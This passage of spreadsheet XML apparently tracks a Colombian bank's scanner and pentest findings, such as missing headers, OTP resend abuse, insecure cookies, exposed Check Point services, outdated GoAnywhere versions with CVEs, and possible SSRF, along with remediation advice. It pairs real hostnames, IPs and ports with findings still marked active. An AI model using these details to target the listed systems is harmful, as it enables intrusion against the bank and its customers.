communicated with using HTTPS, instead of using HTTP._x000a_QID Detection Logic:_x000a_This unauthenticated QID looks for the presence of the following HTTP responses:_x000a_Valid directives for X-Frame-Options are:_x000a_X-Frame-Options: DENY - The page cannot be displayed in a frame, regardless of the site attempting to do so._x000a_X-Frame-Options: SAMEORIGIN - The page can only be displayed in a frame on the same origin as the page itself._x000a_X-Frame-Options: ALLOW-FROM RESOURCE-URL - The page can only be displayed in a frame on the specified origin._x000a_Valid directives for X-XSS-Protections are:_x000a_X-XSS-Protection: 1 - Enables XSS filtering (usually default in browsers). If a cross-site scripting attack is detected, the browser will sanitize the page (remove the unsafe parts)._x000a_X-XSS-Protection: 1; mode=block - Enables XSS filtering. Rather than sanitizing the page, the browser will prevent rendering of the page if an attack is detected._x000a_X-XSS-Protection: 1; report=URI  - Enables XSS filtering. If a cross-site scripting attack is detected, the browser will sanitize the page and report the violation. This uses the functionality of the CSP report-uri directive to send a report._x000a_X-XSS-Protection: 0 disables this directive and hence is also treated as not detected._x000a_A valid directive for X-Content-Type-Options: nosniff_x000a_A valid HSTS directive Strict-Transport-Security: max-age=&lt;expire-time&gt;; [; includeSubDomains][; preload]_x000a_NOTE: All report-only directives (where applicable) are considered invalid."/>
    <s v="Note: To better debug the results of this QID, it is requested that customers execute commands to simulate the following functionality: curl -lkL --verbose._x000a_CWE-693: Protection Mechanism Failure mentions the following - The product does not use or incorrectly uses a protection mechanism that provides sufficient defense against directed attacks against the product. A &quot;missing&quot; protection mechanism occurs when the application does not define any mechanism against a certain class of attack. An &quot;insufficient&quot; protection mechanism might provide some defenses - for example, against the most common attacks - but it does not protect against everything that is intended. Finally, an &quot;ignored&quot; mechanism occurs when a mechanism is available and in active use within the product, but the developer has not applied it in some code path._x000a_Customers are advised to set proper X-Frame-Options, X-XSS-Protection, X-Content-Type-Options and Strict-Transport-Security HTTP response headers._x000a_Depending on their server software, customers can set directives in their site configuration or Web.config files. Few examples are:_x000a_X-Frame-Options:_x000a_Apache: Header always append X-Frame-Options SAMEORIGIN_x000a_nginx: add_header X-Frame-Options SAMEORIGIN;_x000a_HAProxy: rspadd X-Frame-Options:\ SAMEORIGIN_x000a_IIS: &lt;HTTPPROTOCOL&gt;&lt;CUSTOMHEADERS&gt;&lt;ADD NAME=&quot;X-Frame-Options&quot; VALUE=&quot;SAMEORIGIN&quot;&gt;&lt;/ADD&gt;&lt;/CUSTOMHEADERS&gt;&lt;/HTTPPROTOCOL&gt;_x000a_X-XSS-Protection:_x000a_Apache: Header always set X-XSS-Protection &quot;1; mode=block&quot; _x000a_PHP: header(&quot;X-XSS-Protection: 1; mode=block&quot;);_x000a_X-Content-Type-Options:_x000a_Apache: Header always set X-Content-Type-Options: nosniff_x000a_HTTP Strict-Transport-Security:_x000a_Apache: Header always set Strict-Transport-Security &quot;max-age=31536000; includeSubDomains&quot;_x000a_Nginx: add_header Strict-Transport-Security max-age=31536000;_x000a_Note: Network devices that include a HTTP/HTTPS console for administrative/management purposes often do not include all/some of the security headers. This is a known issue and it is recommend to contact the vendor for a solution."/>
    <m/>
    <m/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="502"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-57766916-2885-4af4-bd93-4d835ceee0b2"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-1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Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="503"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-d8d6ab57-6c02-43a0-9b90-4931ebb67944"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-1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Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="504"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-fe5e927d-d961-4c67-b147-521a7692d68b"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-12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aime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="505"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-5d7bb25f-705e-4409-b0a2-0ff116aed6e9"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-1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Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="506"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-7023526d-f423-42dc-b894-f6e770070ae9"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-12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aime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="507"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-c6bc736a-a867-479c-98eb-3e5c384a1b65"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-1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Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="508"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-aff5a77d-696b-4c6b-a827-f46bbb3683d9"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-12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aime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="509"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-a8548726-b3f7-441a-84a3-56fc77a7f34e"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-1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Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="510"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-fb4867b9-a817-488d-85ae-c68f89aa59bf"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-12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aime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="511"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-a62e6542-0d84-4925-85ff-395c81615efd"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-1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Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="512"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-3bdab847-80ec-4f89-bfd4-d207e2a34ba3"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-12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aime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="513"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-c918499c-9bcc-4283-9aaf-0d0e6bcaa37e"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-1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Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="514"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-fd9034b5-2ac6-4d8b-884c-2772717ccf2a"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-12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aime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="515"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-87b593a9-ba0f-4310-97dc-9c0d0bb8332f"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-1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Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="516"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-d0d0535a-191b-4771-9d82-8e5eea8c8da1"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-12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aime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="517"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-5d974671-0ee9-49cb-80af-7e3d9781879a"/>
    <m/>
    <x v="123"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="portalpagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="A potentially sensitive file, directory, or directory listing was discovered on the Web server."/>
    <s v="Verify that access to this file or directory is permitted. If necessary, remove it or apply access controls to it."/>
    <m/>
    <m/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="518"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-7c872ea0-e43b-4cce-b92b-288bd1f496b1"/>
    <m/>
    <x v="123"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="portalrecaudos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="A potentially sensitive file, directory, or directory listing was discovered on the Web server."/>
    <s v="Verify that access to this file or directory is permitted. If necessary, remove it or apply access controls to it."/>
    <m/>
    <m/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="519"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-141c03a2-c239-474d-ab3a-8635c71ba7b9"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-05T00:00:00"/>
    <n v="291"/>
    <d v="2025-12-04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Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="520"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Información"/>
    <s v="MAN-68e78bb0c27f315eb11bab4d"/>
    <s v="SCBD-25-CNMPO-009-AP-001"/>
    <x v="205"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <n v="7.1"/>
    <m/>
    <m/>
    <s v="https://servicios.santander.com.co/PortalDeInforma_x000a_cion/account/v1/account/send_otp_email_portal"/>
    <m/>
    <m/>
    <d v="2025-10-09T00:00:00"/>
    <n v="257"/>
    <d v="2025-11-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas sobre la aplicación se ha podido comprobar que una vez se genera_x000a_la url para solicitar el código OTP, almacenado en un parámetro GET, se puede utilizar dicha url_x000a_continuamente provocando la generación y envío del código al usuario que lo tenga configurado._x000a_Si bien esto no es un problema de seguridad en cuanto a la interceptación del código OTP, si se_x000a_puede utilizar para ataques de ingeniería social dónde se le haga pensar al usuario que al visitar un_x000a_determinado sitio propuesto por el atacante este recibe un código que ve que es legítimo y_x000a_proporcione el código al atacante. "/>
    <s v="Exposición del OTP facilita la suplantación si el atacante puede leer la URL; el reenvío masivo de la_x000a_petición provoca spam de códigos al usuario, posible agotamiento de servicios de mensajería, costes_x000a_operacionales y confusión del usuario que puede derivar en errores de seguridad (aceptación de_x000a_códigos no solicitados). En escenarios donde el OTP habilita operaciones sensibles, la_x000a_confidencialidad comprometida puede llevar a compromisos de cuenta."/>
    <s v="Se recomienda seguir las siguientes indicaciones:_x000a_• Nunca enviar tokens sensibles en la URL. Mover el código OTP a cuerpo de petición POST o_x000a_transmitirlo por canales seguros server-to-server._x000a_• Usar siempre HTTPS con HSTS y asegurar que no queden trazas en referer o logs._x000a_• Implementar tokens anti-replay: cada petición de envío debe exigir un nonce único y_x000a_marcado como usado al primer envío._x000a_• Aplicar rate limiting por usuario, por destinatario (teléfono/email) y por IP; incluir backoff_x000a_exponencial y bloqueo temporal tras umbrales._x000a_• Limitar caducidad y reutilización: OTP de vida muy corta y marcar como inválido tras primer_x000a_envío o primer uso._x000a_• Verificación de intención: para reenvíos, requiere acción explícita del usuario autenticado o_x000a_un CAPTCHA para prevenir automatización._x000a_• Registro y alertas: monitorizar picos en envíos de OTP y alertar/mitigar automáticamente._x000a_• Evitar inclusión en referer: configurar cabeceras y políticas para que no se envíe la URL a_x000a_terceros._x000a_• Pruebas y revisión: revisar logs y flujos para garantizar que parámetros sensibles no se_x000a_almacenan."/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="521"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Información"/>
    <s v="QA-WAS-b541cc67-a25e-42f5-9be9-4b8dc358a76b"/>
    <s v="SCBD-25-CNMPO-009-AP-002"/>
    <x v="118"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="3.6"/>
    <m/>
    <m/>
    <s v="https://servicios.santander.com.co/PortalDeInformacion/customer/v1/customer/customerI_x000a_nformationPortal"/>
    <m/>
    <m/>
    <d v="2025-10-09T00:00:00"/>
    <m/>
    <d v="2026-01-07T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión_x000a_no tienen aplicado el atributo de seguridad &quot;secure&quot;. Este atributo indica al navegador que sólo_x000a_incluya la cookie si se envía a través de un canal cifrado como es el caso del protocolo HTTPS._x000a_La siguiente captura demuestra la ausencia del atributo mencionado en las cookies que manejan_x000a_datos de la sesión del usuario. "/>
    <s v="El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un_x000a_atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos_x000a_dentro de la aplicación."/>
    <s v="Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad &quot;secure&quot;. De esta manera se evitando que el identificador de sesión pueda ser transmitido por canales no cifrados._x000a_La solución concreta dependerá del lenguaje o framework en el que esté implementado la aplicación."/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="522"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="MAN-68c98ad93226c04237be7abf"/>
    <m/>
    <x v="201"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="4"/>
    <m/>
    <m/>
    <s v="https://181.57.221.234/#/views/home"/>
    <m/>
    <m/>
    <d v="2025-09-16T00:00:00"/>
    <n v="280"/>
    <d v="2025-12-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="523"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="MAN-68db7293c27f315eb11978de"/>
    <m/>
    <x v="206"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="4.8"/>
    <m/>
    <m/>
    <s v="https://181.57.221.233"/>
    <m/>
    <m/>
    <d v="2025-10-11T00:00:00"/>
    <n v="255"/>
    <d v="2026-01-09T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="524"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="MAN-68db71d8c27f315eb11978dd"/>
    <m/>
    <x v="207"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="4.8"/>
    <m/>
    <m/>
    <s v="https://181.57.221.233"/>
    <m/>
    <m/>
    <d v="2025-10-12T00:00:00"/>
    <m/>
    <d v="2026-01-10T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="525"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="VPN"/>
    <m/>
    <s v="C-25-CNMPA-012-CO-001"/>
    <x v="208"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3"/>
    <m/>
    <m/>
    <s v="vpnbsnc.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-10-09T00:00:00"/>
    <m/>
    <d v="2026-02-06T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="l servicio de Topología/SecuRemote de Check Point (puerto TCP 264) responde a consultas pre_x0002_autenticadas que permiten recuperar información identificativa del propio firewall y de la estación  de gestión. Con una simple consulta el dispositivo puede devolver el nombre del host del firewall y  el CN/ICA del certificado de la gestión, exponiendo nombres identificativos"/>
    <s v="Cerrar o restringir el acceso al puerto 264 desde Internet y permitirlo solo en la red de gestión _x000a_(ACLs/zonas de confianza). Revisar la configuración de Check Point para deshabilitar servicios de _x000a_descubrimiento innecesarios o minimizar la información que devuelven, y aplicar control de acceso _x000a_basado en IP/VPN para la estación de gestión. Complementariamente, alertar/monitorizar intentos _x000a_de conexión a dicho puerto (logs/IDS) y revisar las políticas de segmentación para asegurar que la _x000a_SmartCenter no sea accesible desde redes públicas."/>
    <s v="Aunque no permite acceso directo, esta filtración es información de reconocimiento de valor para _x000a_un atacante: identifica la existencia de una infraestructura Check Point, el nombre y localización lógica de la estación de gestión y posibles dominios/certificados asociados. Ese dato facilita ataques  dirigidos (phishing/credential stuffing contra administradores), mapeo de la red y selección de  exploits/firmware específicos, y reduce la incertidumbre previa a intentos de intrusión o ingeniería _x000a_social. Además, si la gestión está accesible desde redes no confiables, puede indicar una mala _x000a_segmentación que aumente el riesgo de compromiso."/>
    <m/>
    <m/>
    <s v="Angie Cubillos"/>
  </r>
  <r>
    <n v="526"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Go Any Where "/>
    <s v="MAN-68f9f9364f1323618c1a6b3d"/>
    <s v="SC-25-CNMPO-014-CO-001"/>
    <x v="209"/>
    <m/>
    <s v="Active"/>
    <x v="4"/>
    <n v="8.3000000000000007"/>
    <m/>
    <m/>
    <s v="181.57.221.232:22419"/>
    <m/>
    <m/>
    <d v="2025-10-23T00:00:00"/>
    <n v="243"/>
    <d v="2025-11-22T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="e han encontrado evidencias de la presencia de varias debilidades y fallos de seguridad en  versiones antiguas de software. Estas vulnerabilidades pueden incluir errores de programación,  brechas de seguridad conocidas, problemas de cifrado débil o fallos en la autenticación, entre otros. Concretamente, no existe una PoC pública para su explotación, pero sí hay análisis técnicos públicos  y evidencia de explotación, lo que indica que actores ya disponen de formas de explotarlo._x000a_Además, no se descarta la existencia de un exploit no público._x000a__x000a_CVE-2025-10035_x000a_CVE-2024-0204_x000a_CVE-2023-0669_x000a_CVE-2024-25156"/>
    <s v="Se deberá actualizar la versión de la librería a su última versión._x000a_Se recomienda evitar que la aplicación devuelva al usuario información relativa a la naturaleza y _x000a_versión de ésta. Este tipo de información puede ser accesible a través de los identificadores de sesión _x000a_utilizados, mensajes de error y/o páginas por defecto._x000a_Se deberá modificar y adecuar la gestión de errores no controlados del Sistema."/>
    <s v="Conocer la versión y tipo del software que se está ejecutando en el activo analizado permite a un _x000a_atacante localizar las vulnerabilidades publicadas y utilizar los exploits apropiados para explotar las _x000a_mismas.  De esta manera, el atacante podría hacerse con el control del activo analizado de ser éste vulnerable."/>
    <m/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="527"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Go Any Where "/>
    <s v="MAN-68f9f8a54f1323618c1a6b28"/>
    <s v="SC-25-CNMPO-014-CO-002"/>
    <x v="210"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="6.5"/>
    <m/>
    <m/>
    <s v="https://servicios.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-10-23T00:00:00"/>
    <m/>
    <d v="2026-01-21T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas contra la aplicación de esta revisión, se ha podido determinar que  existen referencias y código de software con fallos de seguridad. Se ha podido observar que el  Servidor responde con datos sensibles a las peticiones realizadas por la aplicación, desvelando  información acerca de la versión y aplicación utilizadas de las librerías jquery-ui y DOMPurify, más  concretamente en sus versiones:_x000a_• jquery-ui 1.12.1_x000a_• DOMPurify 2.3.6"/>
    <s v="Se deberá actualizar la versión de la librería a su última versión._x000a_Se recomienda evitar que la aplicación devuelva al usuario información relativa a la naturaleza y _x000a_versión de ésta. Este tipo de información puede ser accesible a través de los identificadores de sesión _x000a_utilizados, mensajes de error y/o páginas por defecto._x000a_Se deberá modificar y adecuar la gestión de errores no controlados del Sistema."/>
    <s v="Conocer la versión y tipo del software que se está ejecutando en el activo analizado permite a un _x000a_atacante localizar las vulnerabilidades publicadas y utilizar los exploits apropiados para explotar las _x000a_mismas. _x000a_De esta manera, el atacante podría hacerse con el control del activo analizado de ser éste vulnerable."/>
    <m/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="528"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Go Any Where "/>
    <m/>
    <s v="SC-25-CNMPO-014-CO-003"/>
    <x v="211"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.1"/>
    <m/>
    <m/>
    <s v="https://servicios.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-10-23T00:00:00"/>
    <m/>
    <d v="2026-02-20T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Debido a una mala configuración del servidor, la aplicación puede realizar consultas DNS externas  basadas en datos proporcionados por un atacante. Durante las pruebas se observó que la aplicación  ejecutó una resolución DNS hacia un dominio bajo control del atacante, el cual fue inyectado  mediante la cabecera Host de una petición HTTP._x000a_Este comportamiento expone información interna del servidor, como su dirección IP, y confirma que  es posible manipular la aplicación para que inicie conexiones salientes. Aunque esto no expone directamente datos sensibles, demuestra que el servidor puede actuar como intermediario para  interactuar con sistemas externos, lo que potencialmente habilita ataques más avanzados como  Server-Side Request Forgery (SSRF) o exfiltración de datos mediante DNS."/>
    <s v="Se recomienda validar y sanear correctamente todas las cabeceras HTTP recibidas, en especial la _x000a_cabecera Host, para evitar el procesamiento de valores arbitrarios._x000a_Además, es aconsejable deshabilitar cualquier funcionalidad que permita resoluciones DNS _x000a_salientes desde el servidor, salvo que sea estrictamente necesaria para la operación de la _x000a_aplicación._x000a_Finalmente, se debe implementar un filtrado de tráfico saliente (egress filtering) para restringir las _x000a_conexiones del Servidor únicamente a destinos previamente autorizados y controlados."/>
    <s v="El comportamiento observado sugiere la existencia de una posible vector de Server-Side Request _x000a_Forgery (SSRF) o de descubrimiento de servicios internos. _x000a_Aunque en esta fase solo se ha confirmado la resolución de dominios externos, si el Servidor _x000a_permitiese conexiones salientes más allá del DNS (por ejemplo, mediante TCP), esto podría facilitar _x000a_ataques más graves, como escaneo de puertos internos, acceso a metadatos en servicios en la nube _x000a_o, en ciertos escenarios, incluso la ejecución remota de código."/>
    <m/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="529"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <m/>
    <s v="SC-25-CNMPO-013-AP-001"/>
    <x v="117"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://confirming_x0002_factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-10-23T00:00:00"/>
    <m/>
    <d v="2026-01-21T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La ausencia de un correcto control de captura y gestión de los errores producidos en la aplicación  presenta múltiples problemas de seguridad. _x000a_La problemática más común suele ser la revelación de información interna en mensajes de error,  tales como volcados de pila con información del motivo del error, información interna de la base de datos, información específica de la tecnología utilizada, etc."/>
    <s v="Se deben capturar y controlar todas los errores y excepciones producidas en la aplicación, o en los _x000a_sistemas que las sustentan, evitando proporcionar información útil a un posible atacante. _x000a_Adicionalmente, se recomienda personalizar las páginas de error HTTP 40x y 50x para que no sean _x000a_descriptivas."/>
    <s v="Con estos datos revelados en los errores un atacante puede obtener información interna de la _x000a_aplicación o de las tecnologías utilizadas para sustentar la aplicación. De esta manera, el atacante _x000a_dispondrá de más información para poder realizar ataques especialmente dirigidos con una mayor _x000a_probabilidad de éxito, sobre las aplicaciones afectadas y/o los sistemas que la sustentan."/>
    <m/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="530"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="MAN-691b3f6f5459c5351f04d203"/>
    <s v="SC-25-CNMPO-017-AP-001"/>
    <x v="142"/>
    <m/>
    <s v="Solved"/>
    <x v="0"/>
    <n v="10"/>
    <m/>
    <m/>
    <s v="www.cdt.santander.com.co_x000a_api.cdt.santander.com.co"/>
